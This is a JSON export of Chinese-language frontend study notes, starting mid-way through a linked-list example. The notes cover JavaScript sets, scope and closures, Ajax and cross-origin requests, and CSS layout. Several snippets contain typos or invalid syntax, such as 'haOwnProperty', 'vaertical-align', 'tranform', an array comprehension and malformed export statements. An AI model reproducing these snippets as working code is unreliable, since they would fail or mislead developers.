null; this.next = null; &#125; let length = 0; let head = null; let tail = null; this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0) &#123; if(!head) &#123; head = node; tail = node; &#125; else &#123; node.next = current; current.prev = node; head = node; &#125; &#125; else if (position === length) &#123; current = tail; current.next = node; node.prev = current; tail = node; &#125; else &#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; node.prev = previous; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; if(length === 1) &#123; tail = null; &#125; else &#123; head.prev = null; &#125; &#125; else if (position === length-1) &#123; current = tail; tail = current.prev; tail.next = null; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; current.next.prev = previous; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125;;&#125; 循环链表与普通链表的区别在于tail.next不是null而是head。 集合集合由一组无序且唯一的项组成。 创建集合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120function Set() &#123; let items = &#123;&#125;; this.has = function(value) &#123; return items.hasOwnProperty(value); &#125;; this.add = function(value) &#123; if(!this.has(value))&#123; items[value] = value; return true; &#125; return false; &#125;; this.remove = function(value) &#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false; &#125;; this.clear = function() &#123; items = &#123;&#125;; &#125;; this.size = function() &#123; return Object.keys(items).length; &#125;; //size()方法的兼容版本 this.sizeLegacy = function() &#123; let count = 0; for(let key in items) &#123; if(items.haOwnProperty(key)) ++count; &#125; return count; &#125; this.values = function() &#123; let values = []; for(let i = 0, keys = Object.keys(items); i&lt;keys.length; i++) &#123; values.push(items[keys[i]]) &#125; return values; &#125; //values()的兼容版本 this.valuesLegacy = function() &#123; let values = []; for(let key in items) &#123; if(items.hasOwnProperty(key)) &#123; values.push(items[key]); &#125; &#125; return values; &#125;; //取并集 this.union = function(otherSet) &#123; let unionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; values = otherSet.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; return unionSet; &#125;; //取交集 this.intersection = function(otherSet) &#123; let intersectionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; if(otherSet.has(values[i])) &#123; intersectionSet.add(values[i]); &#125; &#125; return intersectionSet; &#125;; //差集 this.difference = function(otherSet) &#123; let differenceSet = new Set(); let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i])) &#123; differenceSet.add(values[i]); &#125; &#125; return differenceSet; &#125;; //判断是否是另一个集合的子集 this.subset = function(otherSet) &#123; if(this.size() &gt; otherSet.size()) &#123; return false; &#125; else &#123; let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i]))&#123; return false; &#125; &#125; return true; &#125; &#125;; &#125; ES6——Set类 区别：values()方法返回一个Iterator；自身具有size属性；无自带的并集、交集、差集和子集方法，但可以用其他自身方法实现。 并集 123let unionAB = new Set();for (let x of setA) unionAB.add(x);for (let x of setB) unionAB.add(x); 交集 12345678910let intersection = function(setA, setB) &#123; let intersectionSet = new Set(); for (let x of setA) &#123; if(setB.has(x)) &#123; intersectionSet.add(x); &#125; &#125; return intersectionSet;&#125;;let intersectionAB = intersection(setA, setB); 差集 12345678910111213let difference = function(setA, setB) &#123; let differenceSet = new Set(); for (let x of setA) &#123; if (!setB.has(x)) &#123; differenceSet.add(x); &#125; &#125; return differenceSet;&#125;;let differenceAB = difference(setA, setB);//或者用ES6的写法实现differenceAB = new Set([x for (x of setA) if (!setB.has(x))]); 字典和散列表Map和Set 树图","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://yoursite.com/tags/数据结构与算法/"}]},{"title":"JS之闭包和原型那些事儿","slug":"JS之闭包和原型那些事儿","date":"2019-04-02T14:17:33.000Z","updated":"2019-07-25T07:35:04.093Z","comments":true,"path":"2019/04/02/JS之闭包和原型那些事儿/","link":"","permalink":"http://yoursite.com/2019/04/02/JS之闭包和原型那些事儿/","excerpt":"","text":"Part1：作用域和闭包作用域是什么？我们需要一套设计良好的规则用于存储变量，并且之后可以方便地找到这些变量，这套规则被称为作用域。 JS的编译原理在传统编译语言的流程中，程序的源代码在被执行前会经历三个步骤，统称为“编译”。 分词/词法分析 在这个过程中由字符组成的字符串被分解成有意义的代码块，这些代码块即词法单元。比如var a = 2;会分解成var、a、=、2、；。 解析/语法分析 在这个过程中词法单元流（数组）转换成一个由元素逐级嵌套组成的代表程序语法结构的树，即“抽象语法树（AST）”。 代码生成 将抽象语法树转换成可执行代码。比如将var a = 2;的AST转化为一组机器指令，用来创建a变量（分配内存等），并将2存储在a中。 不过JS引擎相对这种传统的编译器要复杂得多，比如JS引擎在语法分析和代码生成时会对运行性能进行优化，包括对冗余元素的优化等。 对于JS来说，编译大多发生在代码执行前的几微秒甚至更短的时间内。 编译器遇到var a时会询问该作用域中是否已经有同名的变量，如果是编译器会忽略该声明，否则会声明一个新的变量a。接下来编译器会为引擎生成运行时所需的代码用于处理a=2这个赋值操作。引擎运行时会首先询问在当前作用域集合中是否存在一个叫作a的变量，如果存在引擎会把2赋给a，否则引擎继续查找该变量，若仍未找到则抛出异常。 JS引擎的LHS和RHS查询LHS查询是查找变量的容器本身，从而对变量赋值；RHS查询即查找某个变量的值，或者说是取到它的源值。 “寻找赋值操作的目标”=&gt;LHS查询；“获取变量的值”=&gt;RHS查询 在当前作用域中无法找到某个变量时引擎就会在外层嵌套的作用域中继续查找，直到找到该变量或抵达最外层的作用域（全局作用域）为止。 如果RHS查询在所有的嵌套作用域中都找不到所需变量引擎会抛出ReferenceError异常；而引擎在执行LHS查询时如果没有找到目标变量就会在全局作用域中创建一个具有该名称的变量，并将其返还给引擎（在非严格模式下），严格模式下也会报错。 词法作用域词法作用域由变量和块作用域在代码中的位置决定。 有两种欺骗词法的机制：分别是eval()和with关键字的使用。欺骗词法作用域会导致性能下降，所以在代码中尽量不使用。 在执行eval(..)之后的代码时，引擎并不知道eval()内的代码是以动态的形式插入进来并对词法作用域进行修改的。 注意setTimeout(..)和setInterval(..)的第一个参数可以是字符串，字符串的内容会被解释成一段动态生成的函数代码。new Function(..)最后一个参数也可以接受代码字符串，也是类似的，不提倡使用。 with声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域，并且还会产生意想不到的影响，比如下面的例子。 123456789function foo(obj)&#123; with(obj)&#123; a = 2; &#125;&#125;var obj = &#123; b:3 &#125;foo(obj); //注意obj中没有a变量console.log(obj.a); //undefinedconsole.log(a); //2——a变量被泄露到全局作用域上了 函数作用域把代码片段用函数声明进行封装实际上就是用作用域把这些代码隐藏了，将具体内容私有化，同时可以规避命名冲突。 12function foo()&#123;...&#125; //声明了一个具名函数，但foo这个函数名也会“污染”所在作用域foo(); 解决办法： 1(function foo()&#123;...&#125;)(); //立即执行函数表达式IIFE 1234var a = 2;(function IIFE(obj)&#123; console.log(obj.a);&#125;)(window); //可以传入参数，函数也能传 12345678910//用匿名函数setTimeout(function()&#123; alert('..');&#125;,1000);//匿名函数在栈追踪中不会显示出有意义的函数名，使得调试很困难//若没有函数名，当函数需要调用自身时只能通过过期的arguments.callee引用//可以让匿名函数具名setTimeout(function handler()&#123; alert('..');&#125;,1000); 块级作用域如for循环，with关键字，try/catch…还有各种{…} let关键字可以将变量隐式地附加在一个已经存在的块级作用域上。比如let在for循环中会将变量i重新绑定到循环的每个迭代中。 1234567891011for(let i=0;i&lt;len;i++)&#123; console.log(i);&#125;//等同于&#123; let j; for(j=0;j&lt;len;j++)&#123; let i = j; //每个迭代重新绑定 console.log(i); &#125;&#125; 块级作用域有助于垃圾回收，为变量显式声明作用域并进行本地绑定十分有用。 123456789function process(data)&#123; //...&#125;var bigData = &#123;/*..*/&#125;;process(bigData);btn.addEventListener('click',function click(evt)&#123; //click函数会形成一个覆盖整个作用域的闭包，可能导致bigData不被回收 console.log('clicked');&#125;) 通过添加块级作用域解决 12345678910function process(data)&#123; //...&#125;&#123; let bigData = &#123;/*..*/&#125;; process(bigData);&#125;btn.addEventListener('click',function click(evt)&#123; console.log('clicked');&#125;) 作用域提升无论作用域中的声明出现在什么地方都会在代码本身被执行前首先进行处理，所有的声明（变量和函数）都会被“移动”到各自作用域的顶端。 函数声明和变量声明都会被提升，但是函数声明会优先被提升。 12345678foo(); //1var foo;function foo()&#123; //函数声明会被优先提升 console.log(1);&#125;foo = function()&#123; console.log(2);&#125; 12345678//上面的代码实际是这样function foo()&#123; console.log(1);&#125;foo();foo = function()&#123; console.log(2);&#125; 12345678910foo(); //3function foo()&#123; console.log(1);&#125;var foo = function()&#123; console.log(2);&#125;function foo()&#123; //在后面出现的同名函数声明可以覆盖前面的 console.log(3);&#125; 作用域闭包举个例子解释一下 123456789function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); //2——这就是闭包的效果 bar()可以访问foo()的内部作用域，并将bar()作为返回值。然后将返回值赋给了baz，使得bar()函数在自身的词法作用域之外通过调用baz()被执行；foo()执行后其内部作用域不会被回收，因为bar()仍然在使用foo()的作用域。bar()拥有涵盖foo()内部作用域的闭包，使得该作用域能够一直存活，以供bar()在以后任何时间引用 ，bar()持有的对foo()内部作用域的引用就是闭包。 1234567891011function foo()&#123; var a = 2; function baz()&#123; console.log(a); &#125; bar(baz);&#125;function bar(fn)&#123; fn(); //这里会调用传入的内部函数baz，闭包被使用&#125;foo(); 无论通过何种方式将内部函数传递到所在的词法作用域之外，都会使得它持有对原始作用域的引用，所以无论在何处执行这个函数都会使用闭包。 回调函数实际上也在使用闭包。 循环和闭包12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 上面这段代码我们预期会依次输出数字1~5，但实际上会已每秒一次的频率输出五次6。说明输出的是循环结束时的i值，这是因为延迟函数的回调会在循环结束时执行。我们试图假设每次迭代运行时都会给自己捕获一个i的副本，但它们还是被封闭在一个共享的全局作用域中，实际只有一个i。 我们需要在每次迭代中生成一个独有的闭包作用域。 123456789//解决办法一for(var i=1;i&lt;=5;i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;, j*1000); &#125;)(i);&#125; 1234567//解决办法二for(let i=1;i&lt;=5;i++)&#123; //每次迭代变量i都会被重新声明 //第一次迭代之后的每次迭代都会使用上一个迭代结束的值来初始化变量i setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 模块（重点）12345678910111213141516//这是一个模块function module()&#123; var sth1 = 'value'; var sth2 = [1,2,3]; function doSomething()&#123; console.log(sth1); &#125; function doAnother()&#123; console.log(sth2.join(',')); &#125; return &#123; //返回值可以看作模块的公共API doSomething: doSomething, doAnother: doAnother &#125;;&#125;var foo = module(); 模块模式需要具备两个必要条件： 必须有外部的封闭函数，该函数至少被调用一次（每次调用都会创建一个新的模块实例）。 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并可以访问或修改私有属性。 现代模块机制： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var MyModules = (function Manager()&#123; var modules = &#123;&#125;; //模块的内容 function define(name,deps,impl)&#123; //name是我们定义的新模块的名字 //deps是新模块所依赖的模块名字的数组 //impl是个function for(var i=0;i&lt;deps.length;i++)&#123; //将传入的deps数组的每个元素转变为模块的一个引用 deps[i] = modules[deps[i]]; &#125; //通过apply调用impl，将依赖模块的引用作为参数传入新模块的作用域中 modules[name] = impl.apply(impl,deps); &#125; function get(name)&#123; return modules[name]; &#125; return &#123; define: define, get: get &#125;;&#125;)();MyModules.define('bar',[],function()&#123; function hello(who)&#123; return 'hello,' + who; &#125; return &#123; hello: hello &#125;;&#125;);MyModules.define('foo',['bar'],function(bar)&#123; var val = 'happy'; function awesome()&#123; console.log(bar.hello(val).toUpperCase()); &#125; return &#123; awesome: awesome &#125;;&#125;);var bar = MyModules.get('bar');var foo = MyModules.get('foo');console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY 插播apply()和call()的用法：链接 ES6模块API： 1234567891011121314151617181920212223//bar.jsfunction hello(who)&#123; return 'hello,' + who;&#125;export hello;//foo.jsimport hello from 'bar';var val = 'happy';function awesome()&#123; console.log( hello(val).toUpperCase() );&#125;export awesome;//baz.jsmodule foo from 'foo';module bar from 'bar';console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY import可以将一个模块中的一个或多个API导入到当前作用域当中，并分别绑定到变量上；module会将整个模块的API导入并绑定到一个变量上。 模块文件中的内容会被当作包含在作用域闭包中一样来处理，就像函数闭包模块一样。","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"}]},{"title":"Ajax学习笔记","slug":"Ajax学习笔记","date":"2019-02-05T14:16:28.000Z","updated":"2019-02-05T14:17:34.701Z","comments":true,"path":"2019/02/05/Ajax学习笔记/","link":"","permalink":"http://yoursite.com/2019/02/05/Ajax学习笔记/","excerpt":"","text":"认识AjaxAjax：Asynchronous Javascript and XML （即异步的javascript和XML），是一种在无需重新加载整个页面的情况下能够更新部分页面的技术。通过在后台跟服务器进行少量的数据交换，网页就可以实现异步局部更新。 运用HTML和CSS实现页面，然后构建XMLHttpRequest对象进行页面与web服务器间的异步数据交换，页面获取到响应信息后运用Javascript操作DOM，实现局部动态更新。 Ajax-XMLHttpRequest对象构建123456var request;if(window.XMLHttpRequest)&#123; request = new XMLHttpRequest(); //IE7+,Firefox,Chrome,Opera,Safari...&#125;else&#123; request = new ActiveXObject(\"Microsoft.XMLHTTP\"); //IE5,IE6&#125; Ajax-HTTP请求HTTP是计算机通过网络进行通信的规则，是一种无状态的协议。 完整的HTTP请求步骤： 建立TCP连接 Web浏览器向Web服务器发送请求命令 浏览器发送请求头信息 服务器应答 服务器发送应答头信息 服务器向浏览器发送数据 服务器关闭TCP连接 GET：一般用于信息获取，使用URL传递参数，发送信息的数量限制在2000个字符内 POST：一般用于修改服务器上的资源，对所发送信息数无限制 HTTP状态码： 1XX：表示接收到浏览器请求，正在处理信息 2XX：成功，用户请求被正确接收、理解和处理 （200 OK） 3XX：重定向，表示请求没有成功，用户必须采取进一步操作 4XX：客户端错误，表示客户端提交的请求有误 5XX：服务器错误，表示服务器不能完成对请求的处理 XHR发送请求 open(method,url,async) send(string) 1234567request.open(\"GET\",\"get.php\",true);request.send();request.open(\"POST\",\"create.php\",true);//设置头信息request.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");request.send(\"name=nancy&amp;age=3\"); XHR取得响应 responseText：获得字符串形式的响应数据 responseXML：获得XML形式的响应数据 status和statusText：以数字和文本形式返回HTTP状态码 getAllResponseHeader()：获取所有的响应报头 getResponseHeader()：查询响应中的某个字段的值 readyState属性 0：请求未初始化，open还未调用 1：服务器连接已建立，open已经调用了 2：请求已接收 3：请求处理中 4：请求已完成，响应已就绪 12345678910111213141516request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; //判断响应结果 if(request.status === 200)&#123; //成功，通过responseText得到响应文本 return success(request.responseText); &#125;else&#123; //失败，根据响应码判断失败原因 return fail(request.status); &#125; &#125;else&#123; //HTTP请求还在继续... &#125;&#125;request.open('GET','/api/categories');request.send(); JSONJSON：Javascript对象表示法。JSON是存储和交换文本信息的语法，类似XML。它采用键值对的方式组织起来，易于阅读和编写，同时易于机器解析和生成。JSON是独立于语言的，只要符合JSON的规则，无论什么语言都可以解析JSON。 JSON的长度与XML格式相比很短小，读写速度快。JSON可以使用javascrip内建的方法直接进行解析转换成JavaScript对象，十分便捷。 JSON语法规则JSON数据的书写格式：名称/值对 （比如：”name”:”nancy”） JSON的值可以是数字、字符串、逻辑值、数组（在方括号中）、对象（在花括号中）和null。 123456&#123; \"staff\":[ &#123;\"name\":\"nancy\",\"age\":3&#125;, &#123;\"name\":\"pig\",\"age\":2&#125; ]&#125; JSON解析方式12345var jsondata = '&#123;\"staff\":[&#123;\"name\":\"nancy\",\"age\":3&#125;,&#123;\"name\":\"pig\",\"age\":2&#125;]&#125;';//第一种方式用eval不会看JSON数据形式是否合法，直接执行，是不安全的var jsonObj = eval('('+jsondata+')'); //第二种方式用parse函数相对安全var jsonObj2 = JSON.parse(jsondata); 123456789request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; if(request.status === 200)&#123; var data = JSON.parse(request.responseText); if(data.success)&#123;...&#125; else &#123;...&#125; &#125;else &#123; alert(\"发生错误：\"+request.status); &#125; &#125;&#125; 用JQuery实现Ajax jQuery.ajax([settings]) type：类型，”POST“或”GET“，默认为”GET“ url：发送请求的地址 data：是一个对象，连同请求发送到服务器的数据 dataType：预期服务器返回的数据类型。如果不确定，jQuery将自动根据HTTP包MIME信息智能判断，一般采用JSON格式，可设置为”JSON“ success：是一个方法，请求成功后的回调函数。传入返回后的数据，以及包含成功代码的字符串 error：是一个方法，请求失败时调用此函数。传入XMLHttpRequest对象 例如： 1234567891011121314$(document).ready(function()&#123; $(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"json\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 处理跨域方式当协议、子域名、主域名、端口号中任意一个不同时都算作不同域，不同域之间相互请求资源就算作“跨域”。Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，即Javascript同源策略的限制。 方法一：创建代理在同域名的服务器上创建代理。比如现在有两个服务器域名分别为www.beijing.com和www.shanghai.com，在北京的服务器后端（www.beijing.com/proxy-shanghaiservice.php）调用上海服务器（www.shanghai.com/service.php）的服务，然后把响应结果返回给前端。 方法二：JSONPJSONP可用于解决主流浏览器的跨域数据访问问题（不支持POST请求）。 123456789//www.aaa.com某网页&lt;script&gt; function jsonp(json)&#123; alert(json['name']); &#125;&lt;/script&gt;&lt;script src=\"http://www.bbb.com/jsonp.js\"&gt;&lt;/script&gt;//www.bbb.com页面中jsonp(&#123;'name':'nancy','age':3&#125;); 123456789101112131415$(document).ready(function()&#123; $(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"jsonp\", jsonp: \"callback\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 方法三：XHR2HTML5提供的XMLHttpRequest Level2已经实现跨域访问和其他新功能（IE10以下版本不支持） 只需在服务器端添加两句话即可： 12header(&apos;Access-Control-Allow-Origin:*&apos;);header(&apos;Access-Control-Allow-Methods:POST,GET&apos;); 方法四：CORSCORS：Cross-Origin Resource Sharing 1234567891011121314151617181920212223242526function createCORSRequest(method, url) &#123; var xhr = new XMLHttpRequest(); if (\"withCredentials\" in xhr) &#123; // \"withCredentials\"属性是XMLHTTPRequest2中独有的 xhr.open(method, url, true); &#125; else if (typeof XDomainRequest != \"undefined\") &#123; // 检测是否XDomainRequest可用 xhr = new XDomainRequest(); xhr.open(method, url); &#125; else &#123; // 看起来CORS根本不被支持 xhr = null; &#125; return xhr;&#125;var xhr = createCORSRequest('GET', url);if (!xhr) &#123; throw new Error('CORS not supported');&#125; 参考：CORS详解","categories":[],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"深入学习CSS布局","slug":"深入学习CSS布局","date":"2018-11-12T04:45:16.000Z","updated":"2020-01-17T08:29:22.469Z","comments":true,"path":"2018/11/12/深入学习CSS布局/","link":"","permalink":"http://yoursite.com/2018/11/12/深入学习CSS布局/","excerpt":"","text":"0x00前言CSS是个神奇的东西，可以把一个简陋的网页修饰得十分高大上，同时对于初学者来说很好上手，几天就可以快速入门做出一些网页。但是实际上想把CSS里面的知识学透也不是一件容易的事，因为实现某种效果往往会有多种不同的方式，几个常见的属性结合在一起很有可能会得到意想不到的结果，这里面有很多东西要去考虑，需要多去练习和总结才能做到灵活运用。 0x01涉及到的一些基本属性position 值 描述 absolute 生成绝对定位的元素，相对于 static 定位(unpositioned)以外的第一个父元素进行定位。 元素的位置通过 “left”, “top”, “right” ,”bottom” 属性进行规定。 fixed 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 “left”, “top”, “right” , “bottom” 属性进行规定。 relative 生成相对定位的元素，相对于其正常位置进行定位。 因此，”left: 20px” 会向元素的 LEFT 位置添加 20 像素。 static 默认值。没有定位(unpositioned)，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。 inherit 规定应该从父元素继承 position 属性的值。 sticky 新增属性：粘性定位，该定位基于用户滚动的位置。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed; 它会固定在目标位置。（Internet Explorer, Edge 15 及更早 IE 版本不支持 sticky 定位。 Safari 需要使用 -webkit-prefix。） 如果绝对定位（position属性的值为absolute）的元素没有“positioned”祖先元素，那么它会相对于文档的 body 元素，并且随着页面滚动而移动。一个“positioned”元素是指 position 值不是 static 的元素。 display 值 描述 none 此元素不会被显示。 block 此元素将显示为块级元素，此元素前后会带有换行符。 inline 默认。此元素会被显示为内联元素，元素前后没有换行符。 inline-block 行内块元素。（CSS2.1 新增的值） list-item 此元素会作为列表显示。 run-in 此元素会根据上下文作为块级元素或内联元素显示。 table 此元素会作为块级表格来显示（类似 table），表格前后带有换行符。 inline-table 此元素会作为内联表格来显示（类似 table），表格前后没有换行符。 table-row-group 此元素会作为一个或多个行的分组来显示（类似 tbody）。 table-header-group 此元素会作为一个或多个行的分组来显示（类似 thead）。 table-footer-group 此元素会作为一个或多个行的分组来显示（类似 tfoot）。 table-row 此元素会作为一个表格行显示（类似 tr）。 table-column-group 此元素会作为一个或多个列的分组来显示（类似 colgroup）。 table-column 此元素会作为一个单元格列显示（类似 col） table-cell 此元素会作为一个表格单元格显示（类似 td 和 th） table-caption 此元素会作为一个表格标题显示（类似 caption） inherit 规定应该从父元素继承 display 属性的值。 还有一些有趣的display值戳这里 display 是CSS中最重要的用于控制布局的属性。每个元素都有一个默认的 display 值，这与元素的类型有关。对于大多数元素它们的默认值通常是 block 或 inline 。 常见的块级标签：div，p，form，ul，ol，h1~h6，table，dl，hr，address，fieldset，header，footer，section… 常见的行级标签：span，a，img，input，select，label，textarea，b或strong，i或em… float 值 描述 left 元素向左浮动。 right 元素向右浮动。 none 默认值。元素不浮动，并会显示在其在文本中出现的位置。 inherit 规定应该从父元素继承 float 属性的值。 float 属性定义元素在哪个方向浮动。以往这个属性总应用于图像，使文本围绕在图像周围，不过在 CSS 中，任何元素都可以浮动。浮动元素会生成一个块级框，而不论它本身是何种元素。 0x02弹性盒子–Flex Container附链接：阮一峰的flex布局教程 模型说明当元素表现为flex框时，他们沿着两个轴来布局： 主轴（main axis）是沿着flex元素放置的方向延伸的轴。该轴的开始和结束被称为main start和main end。 交叉轴（cross axis）是垂直于flex元素放置方向的轴。该轴的开始和结束被称为cross start和cross end。 设置了display：flex的元素被称为flex容器（flex container） 在flex容器中表现为柔性的盒子的元素被称为flex项。 容器属性flex-direction：用于指定主轴的方向 row：默认值，主轴为水平方向，起点在左端 row-reverse：主轴为水平方向，起点在右端 column：主轴为垂直方向，起点在上沿 column-reverse：主轴为垂直方向，起点在下沿 flex-wrap：用于定义换行方式 nowrap：（默认）不换行 wrap：换行，第一行在上方 wrap-reverse：换行，第一行在下方 flex-flow：flex-direction属性和flex-wrap属性的简写形式默认值为：row nowrap 。 justify-content：定义项目在主轴上的对齐方式。 flex-start：左对齐（默认值） flex-end：右对齐 center：居中 space-between：两端对齐，项目之间间隔相等 space-around：每个项目两侧的间隔相等 align-item：定义在交叉轴上的对齐方式 flex-start：交叉轴起点对齐 flex-end：交叉轴终点对齐 center：交叉轴中点对齐 stretch（默认值）：如果项目没有设置高度或设为auto，将占满整个容器的高度 baseline：项目的第一行文字的基线对齐 align-content：定义多轴线对齐方式如果项目只有一根轴线，该属性不起作用。 flex-start：与交叉轴起点对齐 flex-end：与交叉轴终点对齐 center：与交叉轴中点对齐 stretch：轴线占满整个交叉轴 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布 space-around：每根轴线两侧的间隔都相等 项目属性order：定义项目的排列顺序数值越小，排列越靠前。 order: number; flex-grow：定义项目的放大比例默认值为0，即如果存在剩余空间，也不放大。 flex-grow: number; 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）；如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 flex-shrink：定义项目的缩小比例默认值为1，即如果空间不足，项目缩小。 flex-shrink: number; 如果所有项目的flex-shrink属性都为1，当空间不足时都等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时前者不缩小。 flex-basis定义在分配多余空间之前，项目占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。默认值为auto，即项目本来的大小。可以设置为跟width和height属性一样的值，即项目占据固定空间。 flex是flex-grow，flex-shrink和flex-basis的缩写，默认值为0，1，auto。 align-self允许单个项目有与其他项目不一样的对齐方式，可覆盖align-item值，默认为auto，表示继承父元素的align-item属性，如果没有父元素，则等同于stretch。 该属性可能取6个值，除了auto，其他都与align-items属性完全一致。 flex布局实例附flex实例教程 详见教程示例。 补充： flex属性是flex-grow、flex-shrink、flex-basis属性的简写，默认值为0 1 auto；设置 flex: 1; 表示所有子元素都有相同的长度，且忽略其内部的内容；设置 flex: auto; 相当于 flex:1 1 auto;，设置 flex: none; 相当于 flex: 0 0 auto;。 0x03基本居中布局 设置text-align: center;（水平居中，且只对行内元素和display为inline或inline-block的元素有效） 水平居中 行内元素水平居中text-align:center width:100px; margin:0 auto; 利用tabledisplay:table; margin:0 auto; 利用absolute+transform 12.parent&#123; position:relative; &#125;.child&#123; position:absolute; left:50%; tranform: translateX(-50%); &#125; 利用flex 12.parent&#123; display: flex; &#125;.child&#123; margin: 0 auto; &#125; 1.parent&#123; display:flex; justify-content:center; &#125; 垂直居中（除去使用absolute定位的一些其他方法） 使用flex+align-items 1234.parent&#123; display: flex; align-items: center;&#125; 使用table-cell+vertical-align 1234.parent&#123; display: table-cell; vaertical-align: middle;&#125; 单行内联元素垂直居中 1234#box&#123; height: 120px; line-height: 120px; /*把行高设成高度值*/&#125; 多行内联元素垂直居中 123456.parent&#123; height: 100px; display: flex; flex-direction: column; justify-content: center;&#125; 或者利用table表布局 12345678.parent&#123; display: table; height: 100px;&#125;.child&#123; display: table-cell; vertical-align: middle;&#125; 水平垂直居中对齐 使用绝对定位进行水平垂直居中 123456.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; margin-left:-100px; margin-top:-50px; &#125;/*用translate与之类似*/.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; transform(-50%,-50%); &#125; 另一种使用绝对定位的方法 12.parent&#123; position:relative; &#125;.child&#123; width:100px; height:100px; position:absolute; left:0; right:0; top:0; bottom:0; margin:auto; &#125; 如果改变left，right , top , bottom的值可以让元素向某个方向偏移。 绝对定位+CSS3（未知高度） 1234567.parent&#123; position:relative; &#125;.child&#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);&#125; 用table-cell实现 123456.parent&#123; display: table;&#125;.child&#123; display:table-cell; vertical-align: middle; text-align: center;&#125; 一个神奇的水平居中方法（利用float，position和clear的结合） 1234567891011121314151617181920212223&lt;style&gt; .parent&#123; width:300px; height:200px; border:1px solid red; &#125; /*设置父容器*/ .wrapper&#123; /*自适应内容的宽度*/ float: left; position: relative; left: 50%; /*先让wrapper位于父容器宽度一半地方*/ clear: both; /*避免让后面的wrapper左浮动后与当前wrapper位于同一行*/ &#125; .child&#123; position: relative; /*在当前元素上进行相对定位*/ left: -50%; /*左移元素自身宽度的一半*/ white-space: nowrap; border: 1px solid blue; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;这是第一个尝试&lt;/div&gt; &lt;/div&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;再试试这个&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; flex实现 12345.parent&#123; display:flex; justify-content:center; /*横轴居中*/ align-items:center; /*纵轴居中*/&#125; flex/grid与marign:auto 1234567.parent&#123; height: 100vh; /*必须有高度*/ display: grid; /*或设成flex*/&#125;.child&#123; margin: auto;&#125; 0x04多列布局参考链接 左列定宽，右列自适应float+margin-left实现12.left&#123; float:left; width:100px; &#125;.right&#123; margin-left:100px; &#125; float+overflow实现12.left&#123; width:100px; float:left;&#125;.right&#123; overflow:hidden; &#125; 设置right-fix盒子1234567891011&lt;style&gt; .left&#123; width:100px; float:left; &#125; .right-fix&#123; width:100%; margin-left:-100px; float:right; &#125; .right&#123; margin-left:100px; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right-fix\"&gt; &lt;div class=\"right\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; width:100px; &#125;.right,.left&#123; display:table-cell; &#125; 